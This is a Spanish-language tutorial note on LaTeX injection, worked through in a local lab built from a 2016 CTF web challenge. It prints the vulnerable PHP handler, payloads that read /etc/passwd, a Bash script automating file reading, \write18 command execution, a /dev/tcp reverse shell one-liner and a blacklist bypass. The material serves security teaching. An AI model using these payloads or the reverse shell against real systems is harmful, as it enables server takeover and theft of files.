---

---
------
- Tags: #web #inyeccion #owasp
----
# Definición

> **LaTeX** es un sistema de composición de textos orientado a la creación de documentos escritos que presenten una alta calidad tipográfica.

> Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y **ejecutar código malicioso** en el servidor.

Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.

------
# Explotación de Inyecciones LaTeX en laboratorio

Lo primero que haremos será instalar algunos paquetes para el uso de LaTeX a futuro.

- ``apt install texlive-full -y``
- ``apt install zathura latexmk rubber -y``
- ``xdg-mime query default application/pdf``
- ``xdg-mime default zathura.desktop application/pdf``

Y luego descargaremos una utilidad llamada ``poppler-utils`` que nos va a permitir convertir una archivo **PDF a texto** para poder filtrar cómodamente por cierta líneas.

- ``apt install poppler-utils``

Luego habilitaremos nuestro servidor **HTTP** con ``service apache2 start`` e iremos a la ruta */var/www/html* para poder ejecutar el siguiente comando.

- ``curl -L https://codeload.github.com/internetwache/Internetwache-CTF-2016/tar.gz/master | tar -xz --strip=2 Internetwache-CTF-2016-master/tasks/web90/code``

Una vez obtenido el directorio *web90*, nos meteremos hasta el directorio *code* y moveremos todo el contenido que esté dentro hacia el directorio */var/www/html*, luego cambiaremos nombre el archivo ``config.php.sample`` a ``config.php`` y por ultimo un ``chown www-data:www-data -r *``. Una vez hecho lo anterior podremos empezar con nuestra web ya montada.

----

Si nosotros proporcionamos una cadena de texto como "**Hola esto es una prueba**" y le damos al botón *Generate PDF*, la web nos proporcionará un **URL** para descargar un archivo **PDF** que contenga la cadena de texto que colocamos recién.

![[Latex 1.png]]

Ingresando a ese link veremos el *PDF* con la fuente propia de **LaTeX** que posee una calidad tipográfica excelente. Todos los archivos *.PDF* que nos genere la web se almacenaran en el directorio */var/www/html/pdf*.

Debemos entender que a la hora de generar este tipo de documentos de manera dinámica existen cierto riesgos, para mostrar ejemplos iremos a **nuestro navegador** y colocaremos "**LaTeX Injection**", en nuestro caso ingresaremos al siguiente link que lleva al repositorio de [**PayloadsAllTheThings**](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/) con el que hemos trabajado previamente en otras vulnerabilidades.

![[Latex 2.png]]

Probaremos en nuestro servidor la primera linea a ver como se comporta.

![[Latex 3.png]]

Por lo que podemos ver, por detrás se emplea un **filtro** que detecta cuando se emplea un comando que **no está permitido**, por lo tanto quiere decir que el código está sanitizado en cierta medida, si nos dirigimos al archivo *ajax.php* en el directorio */var/www/html* podremos analizarlo.

![[Latex 4.png]]

Ahí podemos ver que si se utiliza la palabra "*input*" o la palabra "*include*" nos devolverá un "*BLACKLISTED commands used*".

Si prestamos atención a las demás líneas del archivo *ajax.php*, veremos que en la variable ``$CMD`` se está realizando la ejecución de la variable ``$PDFLATEX`` con ``--shell-escape`` y eso es un riesgo porque esto entre otras cosas nos va a permitir ejecutar comandos.

```php
<?php
    include "config.php";
    if(isset($_POST['content']) && isset($_POST['template']) && in_array($_POST['template'], $TEMPLATES)) {
        $TEMPLATE = $_POST['template'];
        $CONTENT = $_POST['content'];

        $USERID = md5(time() . ":" . microtime());
        $USERDIR = $COMPILEDIR . $USERID;

        $header = file_get_contents($TEMPLATEDIR . $TEMPLATE . "/header.tex");
        $footer = file_get_contents($TEMPLATEDIR . $TEMPLATE . "/footer.tex");

        $content = $header.$CONTENT.$footer;

        if(preg_match("(input|include)", $CONTENT)) {
            echo 'BLACKLISTED commands used';
        } else {
            file_put_contents($USERDIR . ".tex", $content);

            $CMD = "cd $COMPILEDIR && $PDFLATEX --shell-escape $USERID.tex";
            $output = shell_exec($CMD);

            if(file_exists($USERDIR . ".pdf")) {
                rename($USERDIR . ".pdf", $OUTPUTDIR . $USERID . ".pdf");
                echo "FILE CREATED: $USERID.pdf\n";
                echo "Download: $DLURL$USERID.pdf\n";
            }

            @unlink($USERDIR . ".tex");
            @unlink($USERDIR . ".log");
            @unlink($USERDIR . ".aux");


            echo "\n\nLOG:\n";
            echo $output;
        }
    } else {
        echo 'Error, wrong data';
    }
?>
```

Si nosotros buscamos en Google *--shell-escape LaTeX Injection* y nos metemos en https://0day.work/hacking-with-latex/ veremos lo siguiente.

![[Latex 5.png]]

El comando ``\write18{command}`` lo que nos permite es **realizar ejecución de comandos**, por lo tanto al utilizar ``--shell-escape`` es vulnerable.

------

Intentemos leer archivos del servidor pero sin hacer uso de *Include* ni de *Input*.

![[Latex 6.png]]

![[Latex 7.png]]

Funcionó, ahora si le echamos un vistazo al contenido del PDF veremos lo siguiente

![[Latex 8.png]]

Solo veremos la primera linea del archivo */etc/passwd*, si quisiéramos ver la siguiente línea del archivo lo que podríamos hacer es copiar la linea ``\read\file to\line`` y volverla a pegar por debajo, tenemos que entender que **si colocamos 8 líneas** con el ``\read\file to\line`` veremos la **octava** línea del */etc/passwd*, si lo colocamos 5 veces, veremos la quinta linea, así sucesivamente.

![[Latex 9.png]]

En este caso veríamos la cuarta línea del */etc/passwd* por haber colocado 4 veces ``\read\file to\line``.

Ahora podríamos construir bucles con un script en **Bash** para que línea por línea nos vaya mostrando el contenido, y la línea que no logre interpretarnos no nos la muestre, ya que hay algunos caracteres especiales que pueden generar conflicto como es el caso del ``_``. Siempre vamos a preferir perder líneas, a que no nos muestre nada.

```bash
#!/bin/bash

# Variables globales
declare -r main_url="http://localhost/ajax.php" 
filename=$1

if [ $1 ]; then
  read_file_to_line="%0A\read\file%20to\line"
  for i in $(seq 1 100); do
    file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_fi
le_to_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i "download" | awk '{print $NF}')

    if [ $file_to_download ]; then
      wget $file_to_download &>/dev/null
  
      file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk '{print $NF}')
      pdftotext $file_to_convert
   
      file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
      rm $file_to_convert

      cat $file_to_read | head -n 1
      rm $file_to_read
      read_file_to_line+="%0A\read\file%20to\line"
    else
      read_file_to_line+="%0A\read\file%20to\line"
    fi
  done
else
  echo -e "\n[!] Uso: $0 /etc/passwd\n\n"
fi

```

## RCE y Reverse Shell a través de LaTeX Injection

Ya vimos como listar el contenido de los archivos internos del servidor, ahora también podríamos llegar a un *RCE* (*Remote Code Execution*) siempre y cuando se esté empleando ``--shell-escape`` por detrás y nos permita utilizar ``\write18{command}``

Si colocamos la siguiente cadena ``\immediate\write18{id}`` proporcionando el comando ``id`` como se ve, si prestamos atención al *Log* que nos da la web, veremos lo siguiente.

![[Latex 10.png]]

En este caso veríamos el output del comando ``id`` en el *Log*.

------

Si nosotros quisiéramos verlo en un archivo *PDF* porque en otro caso que nos suceda **no se nos muestran los Logs**, o porque simplemente nos resulta mas cómodo, deberíamos agregar al ``\write18{id}`` esto ``\write18{id > output}`` y luego meter las líneas que utilizábamos antes para la lectura de archivos proporcionando el archivo ``output`` como objetivo de lectura, que es el *PDF* que almacenará la respuesta del comando ``id``.


![[Latex 11.png]]

De esta manera tendríamos el documento con el output del comando proporcionado.

![[Latex 12.png]]

----

Para enviarnos una **Bash interactiva** lo que podemos hacer es colocar un **Oneliner en base64** que nos asigne una **Bash** tal que ``bash -c "bash -i >& /dev/tcp/192.168.0.194/4343 0>&1"``. Ahora solo queda ponernos en escucha en el *puerto 4343* y enviar la petición con el botón *Generate PDF* y recibiremos la Shell.

```latex
\immediate\write18{bash -c "bash -i  >& /dev/tcp/192.168.0.194/4343 0>&1"}
\newread\file
\openin\file=output
\read\file to\line
\text{\line}
\closein\file
```
## Injection con "input" e "include" en ON

Si el comando ``input`` y el comando ``include`` estuvieran **permitidos**, es decir, que no están en la *Blacklist*, podríamos hacer uso de lo visto previamente combinando estos comandos. 
(Modificamos para este ejemplo el archivo *ajax.php* y le quitamos la Blacklist a ambos comandos, en su lugar colocamos en Blacklist el nombre "*pepito*")

Si colocamos ``\input{/etc/passwd}`` de primeras, recordemos que */etc/passwd* posee caracteres que hacen que falle el programa, los ``_`` por ejemplo, para poder evitar que el programa falle, podemos hacer lo siguiente

```latex
\immediate\write18{cat /etc/passwd | base64 > output}
\input{output}
```

Esto nos brindará un *PDF* con todo el */etc/passwd* en **base64**, por lo tanto si copiamos todo el contenido y lo pegamos en un archivo *data*, podremos hacer esto

- ``cat data | tr -d '\n' | base 64 -d`` 

La herramienta ``tr`` se usa para quitar los saltos de linea del archivo *data*.

## Bypass de Blacklist

Hay veces que podemos hacer un **Bypass** de las líneas que estén dentro de la *Blacklist*, todo esto se podría hacer empleando comandos propios de LaTeX tal que así. ==Esto no se puede emplear para el uso de comandos como== ``input`` o ``include``.

Recordemos que en el punto anterior, colocamos a "*pepito*" en la *Blacklist*, por lo tanto si colocamos esa cadena y le damos a *Generate PDF*, nos dará el error, pero si hacemos uso de los siguientes comandos para fragmentar la palabra en dos partes separadas y luego las unimos podremos evitar el error.

```latex
\def\first{pep}
\def\second{ito}
\first\second
```